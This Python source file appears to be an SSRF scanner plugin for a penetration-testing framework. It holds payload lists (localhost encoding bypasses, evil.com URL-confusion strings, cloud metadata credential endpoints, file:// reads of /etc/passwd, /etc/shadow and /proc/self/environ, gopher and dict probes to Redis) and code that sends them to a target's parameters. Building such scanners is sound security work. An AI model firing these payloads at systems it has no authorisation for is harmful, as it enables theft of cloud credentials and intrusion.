"""SSRF vulnerability scanner — IP bypass, cloud metadata, protocol schemes.

Integrates with ctx.waf_bypass for WAF evasion and ctx.oob for
DNS rebinding and blind SSRF confirmation.
"""

from __future__ import annotations

import logging
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# IP bypass variants for localhost
IP_BYPASS_VARIANTS: list[tuple[str, str]] = [
    # Standard representations
    ("http://127.0.0.1", "Standard localhost"),
    ("http://0.0.0.0", "All interfaces"),
    ("http://localhost", "Localhost hostname"),
    ("http://127.1", "Short localhost"),
    ("http://127.0.1", "Short localhost (3 octets)"),
    # Numeric encoding
    ("http://2130706433", "Decimal IP (127.0.0.1)"),
    ("http://0x7f000001", "Hex IP (127.0.0.1)"),
    ("http://0177.0.0.01", "Octal IP (127.0.0.1)"),
    ("http://0x7f.0x0.0x0.0x1", "Hex dotted (127.0.0.1)"),
    ("http://017700000001", "Full octal (127.0.0.1)"),
    ("http://0177.0.0.1", "Mixed octal (127.0.0.1)"),
    # IPv6 variants
    ("http://[::1]", "IPv6 localhost"),
    ("http://[::ffff:127.0.0.1]", "IPv6 mapped v4 (short)"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped v4 (full)"),
    ("http://[::ffff:7f00:1]", "IPv6 mapped v4 hex"),
    ("http://[0000:0000:0000:0000:0000:0000:0000:0001]", "IPv6 full form"),
    # Port variations
    ("http://127.0.0.1:80", "Localhost port 80"),
    ("http://127.0.0.1:443", "Localhost port 443"),
    ("http://127.0.0.1:8080", "Localhost port 8080"),
    ("http://127.0.0.1:8443", "Localhost port 8443"),
    # DNS rebinding and wildcard services
    ("http://127.0.0.1.nip.io", "DNS rebinding nip.io"),
    ("http://localtest.me", "DNS resolves to 127.0.0.1"),
    ("http://spoofed.burpcollaborator.net", "Burp Collaborator DNS"),
    ("http://127.0.0.1.sslip.io", "DNS rebinding sslip.io"),
    ("http://www.127.0.0.1.nip.io", "Subdomain nip.io"),
    ("http://1.1.1.1.1time.127.0.0.1.1time.repeat.rebind.network", "DNS rebinding repeat"),
    # URL authority/auth bypass
    ("http://user@127.0.0.1", "URL auth bypass (user@)"),
    ("http://127.0.0.1@evil.com", "URL auth confusion (ip@evil)"),
    ("http://evil.com@127.0.0.1", "URL auth confusion (evil@ip)"),
    ("http://127.0.0.1#@evil.com", "Fragment confusion"),
    ("http://127.0.0.1%00@evil.com", "Null byte in authority"),
    # Redirect-based bypass
    ("http://httpbin.org/redirect-to?url=http://169.254.169.254", "Redirect bypass (httpbin)"),
    # Enclosed alphanumeric (rare parsers)
    ("http://①②⑦.⓪.⓪.①", "Enclosed alphanumeric IP"),
    # Protocol variations
    ("gopher://127.0.0.1:6379/_INFO", "Gopher protocol to Redis"),
    ("dict://127.0.0.1:6379/info", "Dict protocol to Redis"),
    ("file:///etc/passwd", "Local file read (Linux)"),
    ("file:///c:/windows/win.ini", "Local file read (Windows)"),
    ("jar:http://127.0.0.1!/", "Java JAR protocol"),
    ("netdoc:///etc/passwd", "Java netdoc protocol"),
]

# Cloud metadata endpoints
CLOUD_METADATA: list[tuple[str, str]] = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata"),
    ("http://169.254.169.254/latest/user-data/", "AWS IMDSv1 user-data"),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS IAM credentials",
    ),
    (
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "AWS EC2 identity credentials",
    ),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance identity"),
    # AWS IMDSv2 (requires token header — probe token endpoint)
    ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token endpoint"),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root"),
    (
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "GCP project ID",
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "GCP service account token",
    ),
    # Azure
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "Azure instance metadata",
    ),
    (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/",
        "Azure managed identity token",
    ),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata root"),
    ("http://169.254.169.254/metadata/v1/id", "DigitalOcean droplet ID"),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v2/instance/", "Oracle Cloud instance metadata"),
    ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud v1 metadata"),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
    ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "Alibaba RAM creds"),
    # Kubernetes
    ("https://kubernetes.default.svc/", "Kubernetes API server"),
    ("https://kubernetes.default.svc/api/v1/namespaces", "Kubernetes namespaces"),
    ("http://10.0.0.1:10250/pods", "Kubelet API (pods)"),
    ("http://10.0.0.1:10255/pods", "Kubelet read-only API"),
    # Docker
    ("http://172.17.0.1:2375/containers/json", "Docker API (containers)"),
    ("http://172.17.0.1:2375/images/json", "Docker API (images)"),
    ("http://172.17.0.1:2376/info", "Docker TLS API (info)"),
    # Consul / Vault / etcd
    ("http://consul.service.consul:8500/v1/agent/members", "Consul agent members"),
    ("http://127.0.0.1:8500/v1/agent/self", "Consul local agent"),
    ("http://127.0.0.1:8200/v1/sys/health", "Vault health endpoint"),
    ("http://127.0.0.1:2379/version", "etcd version"),
    # Rancher
    ("http://rancher-metadata/latest/", "Rancher metadata"),
]

# Protocol schemes
PROTOCOL_SCHEMES: list[tuple[str, str]] = [
    ("file:///etc/passwd", "Local file read (Linux)"),
    ("file:///etc/shadow", "Shadow file read (Linux)"),
    ("file:///proc/self/environ", "Process environment (Linux)"),
    ("file:///c:/windows/win.ini", "Local file read (Windows)"),
    ("file:///c:/boot.ini", "Boot config (Windows)"),
    ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis"),
    ("gopher://127.0.0.1:11211/_stats", "Gopher Memcached"),
    ("gopher://127.0.0.1:25/_EHLO", "Gopher SMTP"),
    ("dict://127.0.0.1:6379/info", "Dict Redis"),
    ("dict://127.0.0.1:11211/stats", "Dict Memcached"),
    ("tftp://127.0.0.1/test", "TFTP protocol"),
    ("ldap://127.0.0.1:389", "LDAP protocol"),
    ("sftp://127.0.0.1/", "SFTP protocol"),
]

# Common SSRF-vulnerable parameters
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "target", "proxy",
    "img", "image", "src", "source", "link", "href", "file",
    "page", "feed", "host", "site", "callback", "return", "next",
    "data", "reference", "ref", "fetch", "load", "resource",
    "html", "val", "domain", "to", "out", "view", "dir",
    "show", "navigation", "open", "url_to", "request", "continue",
    "imageUrl", "iconUrl", "avatarUrl",
]


class SsrfCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssrf_check",
        display_name="SSRF Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "SSRF detection: 40+ localhost bypass variants, 30+ cloud metadata "
            "endpoints, protocol schemes, DNS rebinding. WAF-adaptive."
        ),
        depends_on=["http_headers"],
        produces=["ssrf_results"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        data: dict = {"tested_params": [], "tested_payloads": 0}

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data=data,
            )

        # Get WAF engine
        waf_engine = getattr(ctx, "waf_bypass", None)
        if waf_engine:
            waf_engine.set_waf_from_pipeline(target.host, ctx.pipeline)

        # Get (path, param, method) tuples from crawled data or use defaults
        param_tuples = self._get_params_and_paths(target.host, ctx)
        data["tested_params"] = list({p for _, p, _ in param_tuples})

        payloads_tested = 0

        for path, param, method in param_tuples[:15]:
            if ctx.should_stop or len(findings) >= 5:
                break

            # Test IP bypass variants
            for ssrf_url, desc in IP_BYPASS_VARIANTS:
                if ctx.should_stop:
                    break
                test_urls = [ssrf_url]
                if waf_engine and getattr(waf_engine, "waf_detected", False):
                    test_urls = waf_engine.encode_for_context(
                        ssrf_url, "query",
                    )[:3]

                for payload in test_urls:
                    payloads_tested += 1
                    finding = await self._test_ssrf(
                        ctx, base_url, path, param, payload, desc,
                        method=method,
                    )
                    if finding:
                        findings.append(finding)
                        break
                if findings:
                    break

            # Test cloud metadata
            if not findings:
                for meta_url, desc in CLOUD_METADATA:
                    if ctx.should_stop:
                        break
                    payloads_tested += 1
                    finding = await self._test_ssrf(
                        ctx, base_url, path, param, meta_url, desc,
                        method=method,
                    )
                    if finding:
                        findings.append(finding)
                        break

        data["tested_payloads"] = payloads_tested

        if not findings:
            findings.append(Finding.info(
                "No SSRF detected",
                tags=["pentesting", "ssrf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data=data,
        )

    def _get_params_and_paths(
        self, host: str, ctx,
    ) -> list[tuple[str, str, str]]:
        """Get (path, param, method) tuples from crawled data or defaults."""
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            host, ctx,
            hardcoded_paths=["/", "/profile"],
            hardcoded_params=SSRF_PARAMS,
            param_filter=SSRF_PARAMS,
            max_points=50,
        )
        # Split into SSRF-relevant params (priority) and others
        ssrf_tuples: list[tuple[str, str, str]] = []
        other_tuples: list[tuple[str, str, str]] = []
        for point in inj_points:
            for param in point.params:
                if param.lower() in SSRF_PARAMS:
                    ssrf_tuples.append((point.path, param, point.method))
                elif point.source != "hardcoded":
                    other_tuples.append((point.path, param, point.method))
        # SSRF params first, then other crawled params
        tuples = ssrf_tuples + other_tuples
        if not tuples:
            return [("/", p, "GET") for p in SSRF_PARAMS[:10]]
        return tuples

    async def _test_ssrf(
        self, ctx, base_url: str, path: str, param: str,
        ssrf_url: str, description: str, method: str = "GET",
    ) -> Finding | None:
        """Test a single SSRF payload via GET or POST."""
        try:
            if method == "POST":
                async with ctx.rate:
                    resp = await ctx.http.post(
                        f"{base_url}{path}",
                        data={param: ssrf_url},
                        timeout=10.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
            else:
                url = f"{base_url}{path}?{param}={quote(ssrf_url, safe='')}"
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

            # Skip indicator check for clear rejections (no SSRF happened)
            if resp.status in (301, 302, 303, 404, 405):
                return None

            # Check for SSRF indicators in response (both GET and POST)
            indicators = self._check_ssrf_indicators(body, ssrf_url)
            if indicators:
                is_metadata = "metadata" in description.lower()
                severity = "critical" if is_metadata else "high"
                conf = 0.9 if is_metadata else 0.7
                return getattr(Finding, severity)(
                    f"SSRF detected via {param}: {description}",
                    description=(
                        f"SSRF vulnerability on parameter '{param}'. "
                        f"The server fetched internal resource: {description}"
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {ssrf_url}\n"
                        f"Method: {method}\n"
                        f"Indicators: {', '.join(indicators)}\n"
                        f"Response snippet: {body[:200]}"
                    ),
                    remediation=(
                        "Validate and whitelist URLs server-side. "
                        "Block internal IP ranges. Use SSRF-safe HTTP libraries."
                    ),
                    confidence=conf,
                    tags=["pentesting", "ssrf"],
                )
        except Exception as e:
            logger.debug("ssrf_check: %s", e)
        return None

    @staticmethod
    def _check_ssrf_indicators(body: str, ssrf_url: str) -> list[str]:
        """Check response body for SSRF success indicators.

        Filters out indicators that appear in the SSRF URL itself
        to avoid false positives from reflected URLs in error pages.
        """
        indicators: list[str] = []
        body_lower = body.lower()
        url_lower = ssrf_url.lower()

        def _not_in_url(keywords: tuple[str, ...]) -> list[str]:
            """Return keywords found in body but NOT in the SSRF URL."""
            return [k for k in keywords if k in body_lower and k not in url_lower]

        # AWS metadata indicators
        if "169.254.169.254" in ssrf_url:
            aws_hits = _not_in_url((
                "ami-id", "instance-id", "security-credentials",
                "iam", "instance-type",
            ))
            if aws_hits:
                indicators.append("AWS metadata content")

        # GCP metadata
        if "metadata.google.internal" in ssrf_url:
            gcp_hits = _not_in_url(("project-id", "service-accounts"))
            if gcp_hits:
                indicators.append("GCP metadata content")

        # Local file indicators
        if "file://" in ssrf_url and (
            "root:" in body or "[extensions]" in body
        ):
            indicators.append("Local file content")

        # Internal service indicators — only those NOT in the URL
        svc_hits = _not_in_url((
            "redis_version", "memcached", "mongodb",
            "elasticsearch",
        ))
        if svc_hits:
            indicators.append("Internal service response")

        # Generic: response body contains data not typical for the app
        if len(body) > 0 and "127.0.0.1" in ssrf_url:
            local_hits = _not_in_url((
                "welcome to", "default page", "it works",
                "nginx", "server at", "index of /",
                "directory listing", "apache2 ubuntu",
                "iis windows server",
            ))
            if local_hits:
                indicators.append("Localhost web content")

        # Protocol scheme indicators (gopher/dict to internal services)
        if any(x in ssrf_url for x in ("gopher://", "dict://", "ldap://")):
            protocol_hits = _not_in_url((
                "redis_version", "connected_clients",
                "+ok", "+pong", "memcached",
            ))
            if protocol_hits:
                indicators.append("Protocol scheme SSRF response")

        return indicators
